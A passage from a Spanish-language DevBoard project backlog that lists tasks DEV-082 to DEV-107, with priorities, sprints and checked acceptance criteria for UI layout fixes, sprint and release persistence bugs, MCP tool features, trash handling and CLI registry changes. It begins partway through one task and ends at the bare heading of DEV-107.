Al ingresar a la vista de Configuración (SettingsView), aparece de inmediato el banner de cambios pendientes y el botón "Deshacer cambios" sin que el usuario haya modificado ningún ajuste. Esto se debe a que `isDirty` realiza un `JSON.stringify` ingenuo donde `builtConfig.customItemTypes` es `[]` mientras que en `config.json` dicha propiedad es `undefined`, produciendo un falso positivo permanente.

**Criterios de Aceptación:**
- [x] #1 Al ingresar a Configuración sin editar nada, el banner de cambios pendientes y botón 'Deshacer' deben permanecer ocultos (isDirty = false).
- [x] #2 La función de detección de dirty state debe normalizar propiedades opcionales/vacías (customItemTypes, wipLimits, tabs) para evitar discrepancias estructurales.
- [x] #3 Al modificar efectivamente cualquier valor de configuración, el banner de cambios pendientes debe activarse y responder correctamente a Guardar y Deshacer.

---

#### [DEV-082] Soporte de campo sprint en mutaciones MCP y marcado masivo de criterios de aceptación (ACs)
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.5.0

Requerimiento de usuario originado desde un proyecto consumidor externo.

Como consumidores del servidor MCP de DevBoard al gestionar tareas bajo el estándar Backlog.md, encontramos las siguientes oportunidades de mejora para su evaluación:
1. Poder asignar o mover tareas de sprint directamente vía MCP (actualmente `devboard_update_task` y `devboard_bulk_update_tasks` no admiten el campo `sprint`).
2. Permitir marcar todos los criterios de aceptación en una sola llamada (actualmente sólo existe `toggleAcIndex` individual, lo que en tareas con muchos ACs genera lentitud y riesgo de race conditions).
3. Asegurar que el filtro `sprint` en `devboard_list_tasks` restrinja correctamente las tareas devueltas.
4. Robustecer el formateo de frontmatter cuando los títulos incluyen comillas o tags como `<input ...>`.

Queda a total consideración y diseño del equipo de DevBoard.

**Criterios de Aceptación:**
- [x] #1 El servidor MCP permite actualizar el campo sprint en devboard_update_task y devboard_bulk_update_tasks
- [x] #2 Se dispone de un parámetro (ej: checkAllAcs: true) para alternar todos los ACs en una sola operación sin requerir múltiples tool calls secuenciales
- [x] #3 El filtro sprint en devboard_list_tasks filtra adecuadamente por la propiedad sprint del frontmatter
- [x] #4 El serializador de frontmatter YAML maneja defensivamente caracteres especiales y comillas en títulos

---

#### [DEV-083] backlog no es un sprint
- **Prioridad**: `medium` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

En la vista de Sprints y Backlog (SprintView), los ítems sin sprint asignado (grupo Backlog) no deben indicar porcentaje de completitud ni barra de progreso. El Backlog es un inventario continuo y abierto de tareas no planificadas o pendientes, por lo que mostrar métricas de avance de iteración (ej: '0/14 (0%)') es conceptualmente erróneo.

**Criterios de Aceptación:**
- [x] #1 El bloque de Backlog (ítems sin sprint) no debe mostrar indicador de porcentaje ni barra de progreso.
- [x] #2 El encabezado del Backlog debe indicar el conteo de ítems totales sin métricas de finalización de sprint.
- [x] #3 Los sprints formales continúan mostrando su barra de progreso y ratio de completitud normalmente.

---

#### [DEV-084] incluir soporte para BDD (historias y criterios de aceptacion)
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.5.0

incluir la posibilidad de que se completen los requerimientos en formato historia de usuario con el framework BDD

Historia de usurario / Feature / Requerimiento > COMO (rol) QUIERO (necesidad) PARA (beneficio)
Criterios de aceptacion > Scenario/GIVEN/WHEN/THEN

**Criterios de Aceptación:**
- [x] #1 Agregar botón/atajo en ItemModal para insertar plantilla de Historia de Usuario BDD en la Descripción: COMO (rol) / QUIERO (acción) / PARA (beneficio).
- [x] #2 Agregar botón/atajo en ItemModal para insertar Criterios de Aceptación con formato BDD Scenario: DADO (contexto) / CUANDO (evento) / ENTONCES (resultado).
- [x] #3 Mantener compatibilidad total con texto libre y criterios existentes.

---

#### [DEV-085] La tabla de tareas en la vista de Sprints/Backlog no muestra columnas de Tipo, Estado y Release
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

En la vista de Sprints y Backlog, al desplegar la lista de tareas del Backlog (o de un sprint), la tabla solo mostraba las columnas `#`, `Prio`, `Código` y `Título`. Las columnas `Tipo`, `Estado` y `Release` no se renderizaban en navegadores con un `localStorage` antiguo porque la migración solo forzó la inclusión de `estado`. Se requiere una inicialización defensiva que garantice que las columnas núcleo estén visibles por defecto y un botón de restablecimiento.

**Criterios de Aceptación:**
- [x] #1 La tabla de tareas en Sprints y Backlog renderiza por defecto las columnas Tipo, Estado y Release sin requerir configuración manual.
- [x] #2 Se implementa migración defensiva para usuarios existentes con localStorage desfasado garantizando la visualización de columnas esenciales.
- [x] #3 El popover de Columnas incluye la opción de 'Restablecer por defecto' para recuperar la configuración canónica en un solo clic.

---

#### [DEV-086] Visibilidad de Sprints planificados vacíos en vista de Sprint & Priorización
- **Prioridad**: `urgent` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

Al crear un nuevo Sprint en estado 'planned' (como Sprint 5 recien creado), no se visualiza en la vista de Sprint & Priorización porque el filtro de agrupación excluye sprints planned con 0 tareas, impidiendo planificar y arrastrar o asignar tareas al nuevo sprint.

**Criterios de Aceptación:**
- [x] #1 Los sprints en estado planned vacíos deben mostrarse en la vista de Sprint & Priorización con su drop zone para permitir la planificación.
- [x] #2 El selector inline de sprints en las filas del backlog debe listar todos los sprints disponibles incluyendo sprints planificados.
- [x] #3 El nuevo Sprint 5 debe renderizarse inmediatamente en la vista y permitir arrastrar y soltar tareas desde el Backlog.

---

#### [DEV-087] veo releases en los atributos del item que no existen en la tab release
- **Prioridad**: `medium` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

ej. vv1.1.0, vSprint 4, etc no son releases ni en preparacion ni finalizados

**Criterios de Aceptación:**
- [x] #1 No extraer valores arbitrarios o desalineados de `item.release`/`targetRelease` para las sugerencias de versiones; tomar como fuente canónica las versiones declaradas en `releases.json` (`boardData.releases`).
- [x] #2 En el selector/chips de versiones en `ItemModal`, mostrar únicamente versiones oficiales existentes, priorizando por defecto las versiones `unreleased` (en preparación).
- [x] #3 Permitir tipeo manual libre si el usuario necesita especificar una versión nueva o no listada aún.

---

#### [DEV-088] No es posible cambiar un item a Idea / Discovery
- **Prioridad**: `medium` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

Al seleccionar un item del backlog, el cambio de "estado" a Idea no se persiste y por ende no se visualiza el item en la columna de ideas / discovery. CanonicalStatus y normalizeStatus en backlogMdParser normalizaban ideas a draft, impidiendo su almacenamiento y visualización en la columna col-ideas del tablero Kanban.

**Criterios de Aceptación:**
- [x] #1 CanonicalStatus y normalizeStatus en backlogMdParser.ts reconocen ideas, idea y discovery como estado 'ideas', y formatStatusForMd formatea 'Ideas'.
- [x] #2 Al cambiar el estado a '💡 Idea / Discovery' desde ItemModal.tsx o arrastrando en KanbanBoard, el estado 'ideas' se persiste en memoria y disco sin degradarse a 'draft'.
- [x] #3 Los items en estado 'ideas' son correctamente filtrados y visibles en la columna 'Ideas' (col-ideas) del KanbanBoard al activar la visualización de ideas.

---

#### [DEV-089] Persistencia del campo sprint al guardar desde ItemModal
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

Al seleccionar un sprint y guardar desde el modal de edición de tarea (ItemModal), el item no persiste el campo de sprint en disco ni se refleja correctamente en la vista de Sprints & Priorización, quedando ubicado en Backlog. Debe asegurarse la serialización atómica y bidireccional de sprint/sprints tanto en ItemModal, la API y el parser de Backlog.md.

**Criterios de Aceptación:**
- [x] #1 ItemModal envía el valor de sprint y targetSprint (y limpia adecuadamente si se desasigna el sprint) hacia la API PUT /api/items/:id.
- [x] #2 La API y saveBacklogMdItem sincronizan taskData.sprint, targetSprint y taskData.sprints, escribiendo correctamente la propiedad sprint en el frontmatter del archivo Markdown.
- [x] #3 readProjectBacklog y parseBacklogMd resuelven de forma robusta el sprint activo ya sea desde sprint, targetSprint o sprints array.
- [x] #4 Al cambiar el sprint desde ItemModal y recargar la vista, el ítem permanece en la columna del sprint asignado en la vista de Sprints y en el selector del modal.

---

#### [DEV-090] Sincronización bidireccional de tareas en releases y rediseño UX/UI del drawer
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

Inconsistencia entre tareas con release asignado en Sprint/Backlog y el panel de releases (se mostraba 0 tareas asociadas en el drawer y métrica divergente en la tarjeta). Adicionalmente, el popup/drawer de releases presenta deficiencias graves de UX/UI: el desenfoque de fondo no cubre el 100% de la pantalla (deja la barra de navegación expuesta) y la disposición/alineación de elementos dentro del drawer es deficiente.

**Criterios de Aceptación:**
- [x] #1 Sincronización bidireccional estricta de tareas asociadas a releases: tareas con release/targetRelease v0.5.0 se reflejan inmediatamente en la pestaña de Tareas del drawer y en rel.itemCodes.
- [x] #2 Consistencia en métricas de alcance y progreso del release card con las tareas realmente asociadas al paquete en el drawer y sprint backlog.
- [x] #3 Rediseño UX/UI del drawer de releases: overlay con backdrop-blur 100% viewport (createPortal), cabecera estilizada, tabs modernas y ergonomía refinada de tarjetas y botones de vinculación.

---

#### [DEV-091] Control formal de versiones en ItemModal y persistencia simétrica al desasignar releases
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

Bug en ItemModal: el input de releases agregaba cada prefijo intermedio a selectedReleases en cada pulsación de tecla ('v0', 'v0.', 'v0.6', etc.), inventando versiones que persistían en la UI. Además, al intentar remover un release de una tarea y guardar, el backend restauraba el valor previo ignorando la modificación debido a fallbacks que no contemplaban la desasignación explícita, y existían versiones fantasma (0.6.0) no dadas de alta en releases.json.

**Criterios de Aceptación:**
- [x] #1 Selector de releases controlado en ItemModal: Dropdown y chips basados estrictamente en el registro oficial de versiones (releases.json), eliminando la generación de versiones intermedias por cada tecla pulsada.
- [x] #2 Persistencia simétrica al desasignar: al remover el release de un ítem, el guardado limpia explícitamente release, targetRelease, releases y milestone sin restaurar valores anteriores desde existingTask.
- [x] #3 Sanitización de tareas: eliminación de versiones fantasma no registradas (ej. 0.6.0 en DEV-043, DEV-057, DEV-060, DEV-061), garantizando que solo existan releases formalmente registrados en el Centro de Releases.

---

#### [DEV-092] Alineación de métricas de progreso de Sprint: Ready como estado terminal del desarrollo en KanbanBoard
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

En KanbanBoard.tsx, el banner de Sprint Goal calculaba el progreso considerando únicamente status === 'done' y clasificaba erróneamente 'ready' como 'inProgress', arrojando 0/14 (0%) de progreso y 14 en curso cuando todas las tareas estaban terminadas en 'ready'. En la metodología ágil de DevBoard, 'ready' es el estado terminal del desarrollo en el sprint (Ready for Release), mientras que 'done' pertenece exclusivamente a las tareas ya liberadas en producción.

**Criterios de Aceptación:**
- [x] #1 sprintStats en KanbanBoard.tsx contabiliza como terminadas las tareas con estado ready, done o finish (alineado con App.tsx y SprintView.tsx).
- [x] #2 Tareas en estado ready son excluidas de inProgress en el banner de Sprint Goal, reflejando exclusivamente el trabajo activo en doing o review.
- [x] #3 El indicador porcentual, la barra de progreso y la insignia Objetivo cumplido reflejan fielmente el 100% al alcanzarse el desarrollo completo en ready.

---

#### [DEV-093] Desacople de scroll horizontal en columnas y preservación de sprint al togglear Ideas en KanbanBoard
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

Dos defectos de UX en KanbanBoard: 1) El contenedor principal con overflow-x-auto arrastraba la barra de herramientas, selector de sprint, toggle de vistas y banner de progreso al hacer scroll horizontal para ver columnas derechas (ej. Ready y Done). 2) Al encender o apagar la columna de Ideas, un useEffect con dependencias inestables sobreescribía la selección del usuario (ej. 'all') forzando la vuelta al sprint activo.

**Criterios de Aceptación:**
- [x] #1 El scroll horizontal del tablero Kanban queda encapsulado exclusivamente en el contenedor de columnas, manteniendo fija la barra superior (Sprint Goal, selector de sprint, vista Simple/Ampliada, toggle Ideas) y el banner de progreso sin desplazarse con el scroll.
- [x] #2 La selección del selector de sprint (ej. 'all' / Todos los ítems) se preserva estrictamente al activar o desactivar la columna de ideas, eliminando el re-filtrado forzado al sprint activo.
- [x] #3 Eliminación de anchos mínimos artificiales (md:min-w-[960px]) en la barra superior y banner para que ocupen fluidamente el 100% del ancho del viewport.

---

#### [DEV-094] Estabilización de layout, scrollbar-gutter y alineación de márgenes al alternar Ideas y filtros
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

Eliminación de saltos visuales de layout (jank) al activar/desactivar Ideas o aplicar filtros: 1) Scrollbar layout shift solucionado con scrollbar-gutter: stable en html. 2) Contenedor KanbanBoard alineado con max-w-[1680px] mx-auto. 3) FilterBar desacoplada para no contabilizar includeIdeas como filtro activo. 4) Ancho estable del botón Ideas en la barra de herramientas.

**Criterios de Aceptación:**
- [x] #1 Estabilidad global de scrollbar: incorporar scrollbar-gutter: stable en html para evitar el salto de layout (15px) al filtrar o variar la altura de las tarjetas.
- [x] #2 Alineación de contenedor en KanbanBoard: agregar max-w-[1680px] mx-auto para que coincida exactamente con Header, FilterBar y SprintView, eliminando desfasajes de márgenes en pantallas medianas y anchas.
- [x] #3 Eliminación de sobrecarga semántica en FilterBar: aislar includeIdeas para que no altere hasCustomStatuses ni inserte el botón Limpiar (1) que desplazaba la fila de filtros rápidos.
- [x] #4 Dimensionado estable del botón Ideas en el toolbar de KanbanBoard mediante conteo independiente de ideas disponibles, evitando cambios de ancho y saltos de controles adyacentes.

---

#### [DEV-095] Solución integral de estabilidad de layout en FilterBar ante activación de filtros (Zero-CLS)
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

Eliminación integral de desplazamientos de controles en FilterBar al activar cualquier filtro: 1) Badge numérico de filtros activos desacoplado con position: absolute en la esquina superior derecha del botón Filtros, manteniendo su ancho estrictamente constante y evitando empujar la botonera de filtros rápidos (Todos, Bug, Feature, etc.). 2) Supresión de saltos de ancho por cambio de font-weight en píldoras rápidas de tipo y prioridad (uso de font-medium uniforme). 3) Prevención de salto vertical de FilterBar mediante contenedor nowrap con control de overflow horizontal.

**Criterios de Aceptación:**
- [x] #1 Badge absoluto en botón Filtros: posicionar el contador de filtros activos con position: absolute (-top-1.5 -right-1.5) para que el botón mantenga un ancho idéntico (cero píxeles de desplazamiento hacia los controles de la derecha).
- [x] #2 Estabilidad métrica en píldoras de tipo y prioridad: mantener font-medium tanto en estado activo como inactivo, diferenciando la selección mediante fondo, borde y sombra sin alterar el ancho del texto ni desfasar botones adyacentes.
- [x] #3 Prevención de wrap vertical en FilterBar: contenedor de barra configurado para prevenir que la aparición de Limpiar fuerce salto a una segunda línea o altere la altura del toolbar.
- [x] #4 Botón Limpiar desacoplado: asegurar que el botón Limpiar no altere el alineamiento de los filtros rápidos a su izquierda al montarse o desmontarse.

---

#### [DEV-096] Unificación conceptual de borrado: separación ortogonal de Descartar vs Papelera y persistencia de soft-delete
- **Prioridad**: `high` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.5.0

Resolver la inconsistencia conceptual y de UX en la eliminación de tareas (Opción A):
1. Separación ortogonal estricta entre la dimensión de Estado de Producto ('dismissed' / Descartada) y el Ciclo de Vida Físico ('isDeleted' / Papelera).
2. Eliminar el laberinto de 3 instancias (Backlog -> Archivo -> Papelera -> Purgar): el botón de eliminar envía directo a la Papelera sin pasar por Descartada.
3. Reparar el bug en readProjectBacklog (vite.config.ts) que omitía isDeleted/deletedAt/previousStatus provocando el rebote de tareas a 'Descartada'.
4. En la Papelera, permitir Restaurar al estado original o Purgar definitivamente de forma directa con 1 confirmación.

**Criterios de Aceptación:**
- [x] #1 1. Backend readProjectBacklog mapea de forma determinista isDeleted, deletedAt y previousStatus desde el frontmatter Markdown.
- [x] #2 2. La acción de descartar (status: dismissed) es exclusivamente un cambio de estado de producto sin modales de advertencia destructiva.
- [x] #3 3. El botón de eliminar (tachito) envía directamente a la Papelera (isDeleted: true) con mensaje claro y sin mutar el status a dismissed ni pasar por la vista de Descartados.
- [x] #4 4. En la vista de Archivo y Papelera se resuelven los bucles: la Papelera permite Restaurar al estado anterior o Purgar definitivamente con 1 confirmación.
- [x] #5 5. Limpieza de datos en dev-060 y compatibilidad case-insensitive con claves de frontmatter isdeleted / isDeleted.

---

#### [DEV-097] Simplificación de vistas: Papelera como vista directa y gestión de descartadas desde Backlog y Filtros
- **Prioridad**: `high` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.5.0

Simplificar la arquitectura de vistas eliminando la duplicidad entre Archivo y Backlog:
1. Las tareas descartadas/canceladas (status: dismissed/cancelled) viven naturalmente en el Backlog y Tablero Kanban, ocultas por defecto y visibles activando el filtro de estados.
2. La vista dedicada en la cabecera pasa a ser exclusivamente la 'Papelera' (TrashView), con acceso directo sin subpestañas artificiales.
3. Se remueve la vista redundante ArchiveView.tsx.

**Criterios de Aceptación:**
- [x] #1 1. En Header.tsx, reemplazar el botón de 'Archivo' por acceso directo a 'Papelera' (ícono Trash2 y badge con conteo de elementos en papelera).
- [x] #2 2. En App.tsx, transformar la vista 'archive' en 'trash' dedicada, renderizando directamente TrashView sin subpestañas redundantes.
- [x] #3 3. Garantizar que las tareas 'dismissed' / 'cancelled' se gestionen y visualicen exclusivamente desde Backlog (SprintView) y Kanban (KanbanBoard) gobernadas por filtros de estado (ocultas por defecto).
- [x] #4 4. Limpieza y remoción de ArchiveView.tsx y del estado archiveSubTab.
- [x] #5 5. Validación con npx tsc --noEmit, npm test y npm run backlog:check con 0 errores.

---

#### [DEV-098] Estabilización de layout de scrollbar: eliminación de layout shift en Header entre vistas Home y Papelera
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

Al alternar entre vistas que tienen scroll vertical (como Home/Tablero o Configuración) y vistas cuyo contenido entra completamente en el viewport sin desbordar (como Papelera cuando tiene pocos o ningún elemento), la aparición y desaparición de la barra de desplazamiento vertical de la ventana altera el ancho disponible del viewport (`window.innerWidth - scrollbarWidth`). Esto provocaba un desplazamiento ("layout shift" horizontal) hacia la derecha del encabezado superior (`Header`), el cual está centrado con `max-w-[1680px] mx-auto`.

Causa raíz:
1. `html` contaba con `scrollbar-gutter: stable`, pero sin `overflow-y: scroll`, los navegadores en macOS/Windows con mouse clásico o scrollbars persistentes liberan el espacio del gutter cuando el contenedor no tiene overflow activo.
2. `TrashView` no contaba con el contenedor canónico `max-w-[1680px] mx-auto w-full px-4 sm:px-6` presente en el Header y el Tablero.

**Criterios de Aceptación:**
- [x] #1 Configurar `overflow-y: scroll` en `html` (combinado con `scrollbar-gutter: stable`) en `src/index.css` para garantizar que el ancho del layout viewport permanezca 100% invariable entre todas las vistas.
- [x] #2 Alinear el contenedor de `TrashView` en `App.tsx` y `TrashView.tsx` con el estándar `max-w-[1680px] mx-auto w-full px-4 sm:px-6`.
- [x] #3 Resolver advertencias y variables sin usar en `src/App.tsx` y `src/components/Header.tsx` asegurando compilación TypeScript estricta con 0 errores (`npx tsc --noEmit`).
- [x] #4 Verificar ausencia total de layout shift horizontal del `Header` y validar integridad del backlog con `npm run backlog:check` y `npm test`.

---

#### [DEV-099] Desacople estricto de Sprint vs Release: eliminación de versión falsa vSprint5 y prevención de label smuggling
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.5.0

Al crear o leer tareas pertenecientes a un sprint (como Sprint 5), se producía una sobrecarga semántica ("label smuggling") donde el valor del sprint se propagaba indebidamente a las propiedades `milestone` y `release`. Esto provocaba que en la UI (tablas de `SprintView`, badges de `ItemCard` y selectores de `ItemModal`) apareciera una versión falsa `vSprint 5` / `vSprint5` como si fuera un release oficial, en lugar de dejar la versión vacía (` - `) hasta que el usuario decida formalmente en qué versión se liberará la tarea.

Causa raíz:
1. En `backlog/tasks/dev-096*.md` y `dev-097*.md`, el agente escribió `milestone: "Sprint 5"` en el frontmatter, violando la ortogonalidad entre Sprint y Release.
2. En `vite.config.ts` (`readProjectBacklog`), existía un fallback `milestone: task.milestone || releaseVal || sprintVal`, asignando el `sprintVal` como `milestone` por defecto. A su vez, `releaseVal` leía `task.milestone`, contaminando `release`, `targetRelease` y `releases` con nombres de sprint.
3. El formateo de releases en la interfaz anteponía prefijos `v` indiscriminadamente sobre cualquier texto (`vSprint 5`).

**Criterios de Aceptación:**
- [x] #1 Corregir `vite.config.ts` eliminando cualquier fallback de `sprintVal` a `milestone` o `releaseVal`, y garantizando que valores que contengan "sprint" nunca sean interpretados ni guardados como versiones de release.
- [x] #2 Limpiar `milestone: "Sprint 5"` de los archivos de tareas en `backlog/tasks/` (`DEV-096`, `DEV-097`, etc.) dejando sus campos de release vacíos.
- [x] #3 Asegurar que las tarjetas en `ItemCard`, la columna Release en `SprintView` y el selector de `ItemModal` muestren ` - ` (sin versión asignada) cuando un ítem no tenga release formal.
- [x] #4 Validar compilación (`npx tsc --noEmit`), suite de pruebas (`npm test`) y sincronización (`npm run backlog:check`).

---

#### [DEV-100] Eliminación de confirmación nativa del navegador en vista de Releases y UX de Promoción a Producción
- **Prioridad**: `medium` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.5.0

Al presionar "Liberar" o "Eliminar borrador" en el Centro de Releases (`ReleaseAssembler.tsx`), se invocaba la función nativa del navegador `window.confirm()`. Este diálogo gris del sistema operativo rompía por completo la coherencia estética, diseño y accesibilidad de la aplicación.

Solución:
1. Se clarificó la función del botón "Liberar": promueve una versión en estado 'unreleased' (en preparación) a 'released' (inmutable y desplegada en producción), sella la fecha de publicación oficial y promueve las tareas en 'ready' al estado final 'done'.
2. Se incorporó la variante 'success' en `ConfirmModal` (con icono `Rocket` y paleta esmeralda) para confirmaciones de publicación formal.
3. Se reemplazaron todos los llamados a `window.confirm()` en `ReleaseAssembler.tsx` por instancias de `ConfirmModal` con títulos, mensajes explicativos y detalles precisos del impacto.
4. Se corrigió el contenedor de detalle en `ConfirmModal` removiendo `truncate` y permitiendo multilínea fluida (`break-words text-[11px]`), sintetizando el copy para que sea conciso y armonioso con el espacio.

**Criterios de Aceptación:**
- [x] #1 Extender `ConfirmModal` con la variante 'success' (icono Rocket, acento esmeralda) manteniendo soporte accesible de teclado (Escape/Enter).
- [x] #2 Reemplazar el `window.confirm` de "Liberar" en `ReleaseAssembler.tsx` por `ConfirmModal` descriptivo que aclare que la versión pasará a ser inmutable y promoverá las tareas en 'ready' a 'done'.
- [x] #3 Reemplazar el `window.confirm` de "Eliminar borrador" en `ReleaseAssembler.tsx` por `ConfirmModal` (variante 'danger').
- [x] #4 Ajustar `ConfirmModal` para permitir multilínea sin recorte por `truncate` y sintetizar los textos para óptima proporción visual.
- [x] #5 Validar compilación TypeScript (`npx tsc --noEmit`), suite de pruebas (`npm test`) y sincronización viva (`npm run backlog:check`).

---

#### [DEV-101] Extensión de script audit:ux con detección estática de anti-patrones UX-009 y UX-010
- **Prioridad**: `medium` | **Tipo**: `ux`

Tras los aprendizajes de la retrospectiva de Sprint 5, se requiere enriquecer la herramienta de análisis estático local `scripts/audit-ux-code.cjs` para detectar preventivamente el uso de `truncate` en textos explicativos de diálogos y verificar que los estilos globales mantengan la reserva de espacio de la barra de desplazamiento para evitar layout shifts (CLS).

**Criterios de Aceptación:**
- [x] #1 Incorporar regla UX-009 en scripts/audit-ux-code.cjs para reportar warning si se detecta 'truncate' en componentes modales o de diálogo (ej: *Modal.tsx).
- [x] #2 Incorporar regla UX-010 en scripts/audit-ux-code.cjs para verificar la presencia de 'overflow-y: scroll' y 'scrollbar-gutter: stable' en el archivo principal CSS.
- [x] #3 Ejecutar npm run audit:ux y comprobar que no genere falsos positivos en celdas de tabla o headers.
- [x] #4 UX-009 se acota a archivos cuyo nombre contiene 'Modal' o 'Dialog', de modo que el uso legítimo de `truncate` en celdas de tabla y headers de SprintView y KanbanBoard no se ve afectado
- [x] #5 Los dos casos legítimos de `truncate` dentro de un diálogo (nombre de carpeta y ruta en FolderPickerModal) quedan documentados con un opt-out que exige motivo escrito, en lugar de degradar la severidad de la regla
- [x] #6 UX-010 se reporta con severidad ERROR porque su ausencia reintroduce CLS horizontal, y verifica las dos propiedades dentro del bloque `html` de index.css (no en cualquier parte del archivo)
- [x] #7 Se agrega un test de regresión en `scripts/test-parser.js` que verifica que UX-009 y UX-010 están conectadas y disparan, para evitar el caso del linter que no reporta nada porque no mira nada
- [x] #8 `npx tsc --noEmit` finishes con código 0
- [x] #9 `npm test` finishes con código 0
- [x] #10 `npm run backlog:check` finishes con código 0

---

#### [DEV-102] Actualización integral de documentación y verificación automatizada de coherencia en releases
- **Prioridad**: `high` | **Tipo**: `docs`
- **Sprint / Milestone**: 0.6.0

Actualización integral de toda la documentación del repositorio dev-board para armonizarla con el estado de v0.5.0 y el Sprint 5 recién completado, e incorporación de salvaguarda automatizada pre-release en verify-backlog-sync.js y reglas de calidad para asegurar que ante cada release la documentación sea auditada y actualizada obligatoriamente.

**Criterios de Aceptación:**
- [x] #1 Actualizar README.md a v0.5.0 (Features Overview, 12 herramientas MCP, 100+ tareas, atajos con Papelera y eliminación de Quick Start duplicado).
- [x] #2 Actualizar docs/ARCHITECTURE.md incorporando TrashView.tsx, ruta trash y registro de persistencia (releases.json, sprints.json, retros/).
- [x] #3 Armonizar docs/AGENTIC_PLAYBOOK.md y .agents/rules/backlog-dogfooding.md con el límite canónico en ready (prohibido done en sprint) y scripts/backlogMdParser.ts.
- [x] #4 Actualizar skills en .agents/skills/ (devboard con 12 tools, code-level-ux-auditor con 10 firmas, principal-engineer, rigorous-qa-auditor y list-views-filters).
- [x] #5 Extender scripts/verify-backlog-sync.js con auditoría automática de coherencia de documentación y formalizar el guardrail pre-release en AGENTS.md y QA auditor.

---

#### [DEV-103] Compatibilidad canónica de sincronización y exportación con estándar Backlog.md
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.6.0

Adaptar el motor de sincronización y exportación de tareas en dev-board para que sea 100% compatible con el estándar canónico de Backlog.md: nombres de archivo canónicos con ID en mayúsculas y espacios (sin slugify a minúsculas), sobreescritura de archivos existentes por ID, serialización de status estrictamente en minúsculas (sin 'Ideas'), mapeo de sprints exclusivamente a nombres registrados en sprints.json (sin inventar 'backlog-futuro') y preservación absoluta de itemCodes en releases.json.

**Criterios de Aceptación:**
- [x] #1 Nombres de archivo canónicos en backlogMdParser.ts (${task.id.toUpperCase()} - ${task.title}.md) preservando mayúsculas y espacios sin slugify forzado a minúsculas.
- [x] #2 Sobreescritura in-place de archivos existentes por ID en vite.config.ts, mcp-server.ts y devboard-cli.ts sin generar nombres slug duplicados ni borrar el archivo previo.
- [x] #3 Serialización de status estrictamente en minúsculas (draft, doing, review, ready, done, dismissed) mapeando Ideas/Backlog a draft y prohibiendo mayúsculas o 'Ideas' en frontmatter YAML.
- [x] #4 Mapeo de sprint exclusivamente al name legible registrado en sprints.json (activo/planificado), omitiendo el campo si no pertenece a un sprint válido y eliminando creación de sprints espurios como 'backlog-futuro'.
- [x] #5 Preservación estricta del array itemCodes en releases.json en lecturas, escrituras y mutaciones de tareas en vite.config.ts.
- [x] #6 Validación con suite de tests de parser, integración y verificación de coherencia de backlog (npm test, npm run backlog:check).

---

#### [DEV-104] Estándar XDG y Home Directory para Registro Multi-Proyecto en CLI
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.6.0

Migrar la persistencia del registro global de proyectos del Hub desde el árbol de archivos del paquete instalado (PKG_ROOT/data/projects-registry.json) al directorio del usuario (~/.devboard/registry.json), cumpliendo con estándares XDG y FHS para herramientas de CLI open-source.

**Criterios de Aceptación:**
- [x] #1 Persistir registry de proyectos en ~/.devboard/registry.json (o XDG_CONFIG_HOME) en lugar de PKG_ROOT/data/projects-registry.json.
- [x] #2 Fallback y migración transparente de proyectos existentes desde PKG_ROOT/data/projects-registry.json si existen.
- [x] #3 Garantizar que instalaciones globales (npm i -g) o npx devboard no fallen con EACCES por intentar escribir en node_modules.
- [x] #4 Preservar el repositorio de dev-board limpio sin mutaciones de projects-registry.json al gestionar proyectos externos.

---

#### [DEV-105] Aislamiento Estricto de Datos en Modo Mono-Proyecto (Single-Project Mode)
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.6.0

Garantizar que la ejecución de DevBoard en un repositorio único limite estrictamente las consultas de la API, el estado y el socket SSE al repositorio actual, evitando que tareas de otros repositorios previamente registrados en el Hub se mezclen o transfieran al cliente web.

**Criterios de Aceptación:**
- [x] #1 En modo monoproyecto (ejecutado sin --hub o con DEVBOARD_MODE=single), la API /api/data debe retornar únicamente el proyecto activo local y sus tareas.
- [x] #2 Evitar la carga y el cómputo en memoria de tareas de repositorios externos cuando no se esté en modo Hub.
- [x] #3 Asegurar que Header.tsx renderice el badge local sin desplegar el dropdown de proyectos cuando singleProject es true.
- [x] #4 Preservar el comportamiento multi-proyecto íntegro e intacto cuando se invoque con --hub o --multi.

---

#### [DEV-106] Higiene de Código Abierto: Erradicación de Fallbacks Residuales Propietarios
- **Prioridad**: `medium` | **Tipo**: `tech_debt`
- **Sprint / Milestone**: 0.6.0

Limpieza de código para eliminar residuos y fallbacks hardcodeados con nombres de proyectos privados ('dom') presentes en el frontend, asegurando que la resolución de proyecto activo sea 100% neutral y dinámica para cualquier usuario de la comunidad open-source.

**Criterios de Aceptación:**
- [x] #1 Reemplazar todos los fallbacks al string literal 'dom' en src/App.tsx por resolución dinámica neutral (activeProjectId || projects[0]?.id).
- [x] #2 Reemplazar fallbacks 'dom' en src/components/ItemModal.tsx.
- [x] #3 Reemplazar fallbacks 'dom' en src/components/ImportWizardModal.tsx.
- [x] #4 Garantizar que ningún identificador de proyecto privado quede hardcodeado en la base de código abierta.

---

#### [DEV-107] Verificador y Notificador de Actualizaciones Estilo Supabase CLI
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.6.0

